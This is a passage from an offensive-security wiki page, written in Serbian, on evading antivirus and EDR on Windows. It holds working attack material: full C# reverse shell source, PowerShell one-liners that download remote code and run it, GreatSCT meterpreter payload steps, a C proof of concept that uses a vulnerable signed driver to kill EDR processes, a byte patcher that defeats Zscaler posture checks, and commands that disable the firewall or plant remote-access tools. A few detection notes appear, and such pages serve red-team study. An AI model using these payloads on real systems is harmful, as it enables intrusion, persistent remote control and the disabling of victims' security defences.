- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator pokazuje kako se jezik `C++11/14` može koristiti za generisanje obfuscated koda u trenutku kompajliranja, bez korišćenja eksternog alata i bez izmene kompajlera.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuscated operacija generisanih pomoću C++ template metaprogramming framework-a, što osobi koja želi da crack-uje aplikaciju dodatno otežava posao.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator koji može da obfuscira različite PE fajlove, uključujući: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan engine za metamorphic code namenjen proizvoljnim izvršnim fajlovima.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je fine-grained code obfuscation framework za LLVM-supported jezike koji koristi ROP (return-oriented programming). ROPfuscator obfuscira program na nivou assembly koda tako što regularne instrukcije transformiše u ROP chains, čime narušava našu uobičajenu predstavu o normalnom control flow-u.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u jeziku Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može da konvertuje postojeći EXE/DLL u shellcode i zatim ga učita

### LLVM compiler-assisted per-function self-masking

Umesto maskiranja čitavog implanta samo dok je neaktivan, izmenjeni LLVM X86 backend može da drži odabrane funkcije XOR-maskirane kad god nisu aktivne. Function Peekaboo PoC bira demangled imena koja sadrže `REG_`, ubacuje position-independent entry/exit stub-ove oko konačnog machine code-a i emituje jedan zajednički masking handler u `.text`; potpisi na source nivou i Windows x64 calling convention ostaju nepromenjeni.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

Ovo pripada fazi nakon instruction selection-a i optimizacije, jer transformacija mora da obuhvati **svaki emitovani return** i da zna tačan x86 raspored. `MachineFunctionPass` pre emitovanja pronalazi poslednji `MachineInstr::isReturn()`, briše ga kako bi se konačna putanja nastavila u dodati epilogue i ranije return instrukcije zamenjuje sa `JMP_1 handler`. Zadržite stack/frame teardown koji kompajler generiše pre svakog return-a; preusmerite samo samu return instrukciju.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` i `emitFunctionBodyEnd()` emituju per-function stub-ove, dok `emitEndOfAsmFile()` emituje handler. Simboli koji se dele između faza emitovanja omogućavaju da prologue branch cilja svoj kasniji epilogue; za ručno emitovani near `je`, upišite `0F 84`, a zatim četvorobajtni MC izraz `target - address_after_je`. Pozivi i skokovi ka handler-u mogu se umesto toga emitovati kao `MCInst` objekti (`CALL64pcrel32` i `JMP_1`). Pass mora da vrati `false` za neselektovanu funkciju kada nije ništa izmenio; PoC pogrešno vraća `true` na toj putanji.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata and pre-CRT initialization

PoC smešta XOR ključ i 16-bajtne zapise koji sadrže loader-relocated function pointer i runtime dužinu u `.funcmeta`. Iako je C polje tipa `uint32_t`, handler pristupa QWORD-u na offset-u zapisa `+8`, čime koristi dužinu i njen padding, i pomera se kroz zapise za `0x10`. Imena PE sekcija zauzimaju samo osam bajtova, pa runtime lookup vidi `.funcmet`. Eksterni patcher dodaje izvršni `.stub`, čuva stari entry-point RVA u stub-u i preusmerava `AddressOfEntryPoint`; PIC stub dobija image base iz `gs:[0x60]` → `[PEB+0x10]`, prolazi kroz PE32+ imports da bi razrešio već importovani `VirtualProtect` i izvršava se pre CRT-a.<sup>[[38]](#references)[[39]](#references)</sup>

Initialization postavlja sentinel u `gs:[0xE8]` i poziva svaku metadata funkciju. Njen prologue, koji je trajno čitljiv, upisuje početak funkcije u `gs:[0xF0]`, detektuje sentinel i preskače još uvek nemaskirano telo. Epilogue zatim koristi `call handler`; nakon što handler sačuva 13 registara (`0x68` bajtova), return address na `[rsp+0x68]` predstavlja kraj transformisane funkcije, pa se `end - start` može upisati u njen metadata zapis. Stub uklanja sentinel i skače na `ImageBase + original_entry_point_RVA` nakon što su sva tela maskirana.<sup>[[38]](#references)[[39]](#references)</sup>

Tokom normalnog poziva, prologue poziva isti simetrični handler da dekodira telo. Konačna putanja prelazi u dodati epilogue, dok svaki raniji return skače direktno u zajednički handler. Normalni epilogue takođe koristi `jmp handler` umesto `call`, pa nakon ponovnog maskiranja `ret` handler-a preuzima return address originalnog caller-a i čuva rezultat funkcije u `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive and analysis indicators

Handler pronalazi trenutni zapis, preskače fiksni vidljivi prologue (`0x46` bajtova u ovoj build verziji), menja ostatak u `PAGE_EXECUTE_READWRITE`, XOR-uje ga bajt po bajt koristeći niži bajt ključa, a zatim ga postavlja na `PAGE_EXECUTE_READ`. Ista petlja zato dekodira pri ulasku i kodira pri svakom normalnom izlasku.<sup>[[38]](#references)[[39]](#references)</sup>

Indikatori visoke pouzdanosti za ovaj dizajn uključuju:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point unutar izvršnog `.stub` i `.funcmet` sekciju koja sadrži ključ i relocated `.text` pointers;
- pre-CRT PEB, import-table i section-table parsing, praćen pozivima kroz svaki metadata pointer;
- identične `call`/`pop` PIC prologue i veliki broj return mesta preusmerenih u jedan handler;
- upise u `gs:[0xE8]`, `gs:[0xF0]` i `gs:[0xF8]`, praćene ponovljenim `VirtualProtect` transitions i bytewise XOR upisima u image-backed izvršne stranice.

Ovo je evasion memory scanner-a, a ne cryptographic protection: patchovani fajl i dalje sadrži originalno clear telo, a debugger može da postavi breakpoint na `VirtualProtect` ili XOR petlju i dump-uje aktivnu funkciju. Jednobajtni XOR, čitljivi metadata podaci i fiksna granica `0x46` takođe čine offline recovery jednostavnim.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> TEB slotovi u PoC-u su thread-local, ali izmenjene code pages su process-wide. Istovremeni ili rekurzivni ulazak zato može ponovo menjati instrukcije dok ih druga invocation izvršava; exceptions i nonlocal exits takođe mogu zaobići ponovno maskiranje. Robusna implementacija mora da sinhronizuje transitions, obnovi protection koji je stvarno vraćen kroz `lpflOldProtect`, izbegava hard-coded stub lengths, proveri i `call` i `jmp` paths zbog x64 stack alignment-a i pozove `FlushInstructionCache` nakon ponovnog upisivanja izvršnih bajtova. Microsoft izričito odgovornost za instruction-cache coherency kada se izvršni kod menja prebacuje na caller-a.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Možda ste videli ovaj ekran prilikom preuzimanja nekih izvršnih fajlova sa interneta i njihovog pokretanja.

Microsoft Defender SmartScreen je security mechanism namenjen zaštiti krajnjeg korisnika od pokretanja potencijalno malicious aplikacija.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom radi na reputation-based pristupu, što znači da će neuobičajeno preuzete aplikacije aktivirati SmartScreen, čime će krajnji korisnik biti upozoren i sprečen da izvrši fajl (iako se fajl i dalje može izvršiti klikom na More Info -> Run anyway).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) sa nazivom Zone.Identifier, koji se automatski kreira prilikom preuzimanja fajlova sa interneta, zajedno sa URL-om sa kog je fajl preuzet.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS-a za fajl preuzet sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da izvršni fajlovi potpisani **trusted** signing certificate-om **neće aktivirati SmartScreen**.

Veoma efikasan način da sprečite da vaši payloads dobiju Mark of The Web jeste da ih zapakujete unutar neke vrste container-a, kao što je ISO. To se dešava zato što Mark-of-the-Web (MOTW) **ne može** da se primeni na **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payloads u output containers kako bi zaobišao Mark-of-the-Web.

Primer upotrebe:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Evo demonstracije za zaobilaženje SmartScreen-a pakovanjem payload-a unutar ISO datoteka pomoću alata [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za logging u Windows-u koji aplikacijama i sistemskim komponentama omogućava da **loguju događaje**. Međutim, security proizvodi ga takođe mogu koristiti za nadgledanje i detektovanje malicious aktivnosti.

Slično načinu na koji se AMSI onemogućava (bypass-uje), moguće je i učiniti da funkcija **`EtwEventWrite`** user space procesa odmah vrati rezultat bez logovanja bilo kakvih događaja. To se postiže patch-ovanjem funkcije u memoriji tako da se odmah vrati, čime se efektivno onemogućava ETW logging za taj proces.

Više informacija možete pronaći na **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) i [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Učitavanje C# binarnih datoteka u memoriju poznato je već duže vreme i i dalje predstavlja odličan način za pokretanje post-exploitation alata bez detektovanja od strane AV-a.

Pošto će payload biti učitan direktno u memoriju bez upisivanja na disk, moraćemo da brinemo samo o patch-ovanju AMSI-ja za ceo proces.

Većina C2 framework-a (sliver, Covenant, metasploit, CobaltStrike, Havoc itd.) već pruža mogućnost direktnog izvršavanja C# assemblies u memoriji, ali postoje različiti načini za to:

- **Fork\&Run**

Ovo podrazumeva **pokretanje novog sacrificial procesa**, inject-ovanje vašeg malicious post-exploitation koda u taj novi proces, izvršavanje malicious koda i, po završetku, gašenje novog procesa. Ovo ima i prednosti i mane. Prednost fork and run metode jeste to što se izvršavanje odvija **izvan** procesa našeg Beacon implant-a. To znači da, ako nešto pođe po zlu ili bude detektovano tokom naše post-exploitation aktivnosti, postoji **mnogo veća šansa** da naš **implant preživi.** Mana je to što postoji **veća šansa** da budete detektovani putem **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Radi se o inject-ovanju malicious post-exploitation koda **u sopstveni proces**. Na ovaj način možete izbeći kreiranje novog procesa i njegovo skeniranje od strane AV-a, ali mana je to što, ako nešto pođe po zlu tokom izvršavanja vašeg payload-a, postoji **mnogo veća šansa** da **izgubite beacon**, jer može doći do njegovog crash-ovanja.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ako želite da pročitate više o učitavanju C# Assembly-ja, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

C# Assemblies možete učitavati i **iz PowerShell-a**; pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [video kompanije S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Korišćenje drugih programskih jezika

Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršavati malicious kod pomoću drugih jezika tako što se kompromitovanoj mašini omogući pristup **interpreter okruženju instaliranom na Attacker Controlled SMB share-u**.

Omogućavanjem pristupa Interpreter Binaries i okruženju na SMB share-u možete **izvršavati proizvoljan kod u ovim jezicima unutar memorije** kompromitovane mašine.

Repo navodi sledeće: Defender i dalje skenira skripte, ali korišćenjem Go-a, Java-e, PHP-a itd. dobijamo **veću fleksibilnost za zaobilaženje statičkih signatura**. Testiranje nasumičnih, ne-obfuskovanih reverse shell skripti u ovim jezicima pokazalo se uspešnim.

## TokenStomping

Token stomping manipuliše access token-om security proizvoda kao što su EDR ili AV. Smanjivanje privilegija token-a može ostaviti proces aktivnim, dok mu istovremeno onemogućava obavljanje privilegovanih akcija inspekcije ili remediation-a.

Da bi ovo sprečio, Windows bi mogao da **onemogući eksternim procesima** dobijanje handle-ova nad token-ima security procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Korišćenje trusted software-a

### Chrome Remote Desktop

Kao što je opisano u [**ovom blog postu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je deploy-ovati Chrome Remote Desktop na računar žrtve, a zatim ga koristiti za preuzimanje kontrole i održavanje persistence-a:<sup>[[35]](#references)</sup>
1. Preuzmite ga sa https://remotedesktop.google.com/, kliknite na "Set up via SSH", a zatim kliknite na MSI datoteku za Windows da biste je preuzeli.
2. Tiho pokrenite installer na računaru žrtve (potrebne su admin privilegije): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na stranicu Chrome Remote Desktop-a i kliknite na Next. Wizard će zatim zatražiti autorizaciju; kliknite na dugme Authorize da biste nastavili.
4. Izvršite dostavljenu komandu uz potrebne izmene: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parametar `--pin` postavlja PIN bez korišćenja GUI-ja).


## Advanced Evasion

Evasion je veoma složena tema; ponekad morate uzeti u obzir veliki broj različitih izvora telemetry-ja u samo jednom sistemu, tako da je praktično nemoguće ostati potpuno neotkriven u zrelim okruženjima.

Svako okruženje protiv kog radite ima sopstvene prednosti i slabosti.

Toplo preporučujem da pogledate ovo predavanje autora [@ATTL4S](https://twitter.com/DaniLJ94) kako biste stekli osnovu za naprednije Evasion tehnike.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je takođe odlično predavanje autora [@mariuszbit](https://twitter.com/mariuszbit) o temi Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Stare tehnike**

### **Provera delova koje Defender prepoznaje kao malicious**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), koji će **uklanjati delove binarne datoteke** sve dok **ne utvrdi koji deo Defender** prepoznaje kao malicious, a zatim će vam ga izdvojiti.\
Drugi alat koji radi **istu stvar jeste** [**avred**](https://github.com/dobin/avred), uz javno dostupan web servis na adresi [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows10, svi Windows sistemi dolazili su sa **Telnet serverom** koji ste mogli da instalirate (kao administrator) pomoću:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Podesite da se **pokreće** pri pokretanju sistema i **pokrenite** ga sada:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Promeni telnet port** (stealth) i onemogući firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Preuzmite ga sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrebna su vam binarna preuzimanja, a ne setup)

**NA HOSTU**: Pokrenite _**winvnc.exe**_ i konfigurišite server:

- Omogućite opciju _Disable TrayIcon_
- Postavite lozinku u _VNC Password_
- Postavite lozinku u _View-Only Password_

Zatim premestite binarni fajl _**winvnc.exe**_ i **novokreirani** fajl _**UltraVNC.ini**_ unutar **žrtve**

#### **Obrnuta veza**

**Napadač** treba da **pokrene unutar** svog **hosta** binarni fajl `vncviewer.exe -listen 5900`, kako bi bio **spreman** da prihvati obrnutu **VNC vezu**. Zatim, unutar **žrtve**: Pokrenite winvnc daemon `winvnc.exe -run` i pokrenite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UPOZORENJE:** Da biste očuvali prikrivenost, ne smete raditi nekoliko stvari

- Nemojte pokretati `winvnc` ako je već pokrenut, jer ćete aktivirati [iskačući prozor](https://i.imgur.com/1SROTTl.png). Proverite da li je pokrenut pomoću `tasklist | findstr winvnc`
- Nemojte pokretati `winvnc` bez fajla `UltraVNC.ini` u istom direktorijumu, jer će se otvoriti [prozor za konfiguraciju](https://i.imgur.com/rfMQWcf.png)
- Nemojte pokretati `winvnc -h` za pomoć, jer ćete aktivirati [iskačući prozor](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite ga sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Unutar GreatSCT-a:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sada **pokrenite lister** pomoću `msfconsole -r file.rc` i **izvršite** **xml payload** pomoću:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Trenutni Defender će veoma brzo prekinuti proces.**

### Kompajliranje sopstvenog reverse shell-a

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# reverse shell

Kompajlirajte ga pomoću:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Koristite ga sa:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# korišćenjem kompajlera
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista C# obfuscatora: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Korišćenje pythona za primer izrade injector-a:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Drugi alati
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Više

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Onemogućavanje AV/EDR zaštite iz kernel prostora

Storm-2603 je koristio mali konzolni alat poznat kao **Antivirus Terminator** za onemogućavanje endpoint zaštite pre instaliranja ransomware-a. Alat donosi **sopstveni ranjivi, ali *potpisani* driver** i zloupotrebljava ga za izvršavanje privilegovanih kernel operacija koje čak ni AV servisi zaštićeni mehanizmom Protected-Process-Light (PPL) ne mogu da blokiraju.<sup>[[12]](#references)</sup>

Ključne napomene
1. **Potpisani driver**: Fajl isporučen na disk je `ServiceMouse.sys`, ali je binarni fajl zapravo legitimno potpisani driver `AToolsKrnl64.sys` kompanije Antiy Labs, iz njenog „System In-Depth Analysis Toolkit“ alata. Pošto driver poseduje važeći Microsoft potpis, učitava se čak i kada je Driver-Signature-Enforcement (DSE) omogućen.
2. **Instalacija servisa**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Prva linija registruje driver kao **kernel servis**, a druga ga pokreće, čime `\\.\ServiceMouse` postaje dostupan iz user land-a.
3. **IOCTL-ovi koje driver izlaže**
| IOCTL kod | Mogućnost                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminiranje proizvoljnog procesa prema PID-u (koristi se za gašenje Defender/EDR servisa) |
| `0x990000D0` | Brisanje proizvoljnog fajla sa diska |
| `0x990001D0` | Unload drivera i uklanjanje servisa |

Minimalni C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Zašto funkcioniše**: BYOVD u potpunosti zaobilazi user-mode zaštitu; kod koji se izvršava u kernelu može da otvara *zaštićene* procese, terminira ih ili menja kernel objekte bez obzira na PPL/PP, ELAM ili druge hardening funkcije.

Detekcija / Mitigacija
•  Omogućite Microsoftovu listu za blokiranje ranjivih drivera (`HVCI`, `Smart App Control`) kako bi Windows odbio da učita `AToolsKrnl64.sys`.
•  Nadgledajte kreiranje novih *kernel* servisa i generišite upozorenje kada se driver učitava iz direktorijuma sa dozvolama za upis svim korisnicima ili kada nije prisutan na allow-listi.
•  Pratite user-mode handle-ove ka prilagođenim device objektima, nakon čega slede sumnjivi `DeviceIoControl` pozivi.

### Zaobilaženje Zscaler Client Connector Posture provera patchovanjem binarnih fajlova na disku

Zscalerov **Client Connector** lokalno primenjuje device-posture pravila i oslanja se na Windows RPC za komunikaciju rezultata sa drugim komponentama. Dva slaba dizajnerska izbora omogućavaju potpuno zaobilaženje:

1. Evaluacija posture-a odvija se **u potpunosti na klijentskoj strani** (serveru se šalje boolean vrednost).
2. Interni RPC endpoint-ovi proveravaju samo da li je izvršni fajl koji se povezuje **potpisao Zscaler** (pomoću `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Patchovanjem četiri potpisana binarna fajla na disku** oba mehanizma mogu biti neutralisana:

| Binarni fajl | Originalna logika koja se patchuje | Rezultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1`, pa je svaka provera usklađena |
| `ZSAService.exe` | Indirektni poziv ka `WinVerifyTrust` | Zamenjeno sa NOP ⇒ bilo koji proces, čak i nepotpisan, može da se poveže na RPC cevi |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjeno sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Provere integriteta tunela | Zaobiđene |

Minimalni isečak patcher-a:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nakon zamene originalnih fajlova i ponovnog pokretanja service stack-a:

* **Sve** posture provere prikazuju **zeleno/usaglašeno**.
* Unsigned ili izmenjeni binarni fajlovi mogu da otvore named-pipe RPC endpoints (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitovani host dobija neograničen pristup internoj mreži definisanoj Zscaler policies.

Ova studija slučaja pokazuje kako se odluke o poverenju donete isključivo na client strani i jednostavne provere potpisa mogu zaobići pomoću nekoliko byte patch-eva.

## Zloupotreba trusted functionality u Microsoft Defender `BTR.sys`

Defender-ov **Boot-Time Removal** driver predstavlja koristan kontraprimer za klasični BYOVD. `BTR.sys` je legitimna Microsoft-signed remediation komponenta bez memory-corruption bug-a i bez IOCTL interfejsa; nakon sticanja administratorskog pristupa i `SeLoadDriverPrivilege`, operator umesto toga može da falsifikuje njegovu privatnu remediation transakciju i dobije predviđene Ring-0 file/registry operacije. Ovo je **post-compromise AV/EDR-neutralization primitive, a ne initial access ili privilege escalation**, a driver se može izdvojiti iz `BOOTTIMETOOL` resource-a unutar sopstvenog target-ovog `MpEngine.dll`, umesto uvoza upadljivog third-party driver-a.<sup>[[36]](#references)</sup>

### Priprema one-shot driver-a

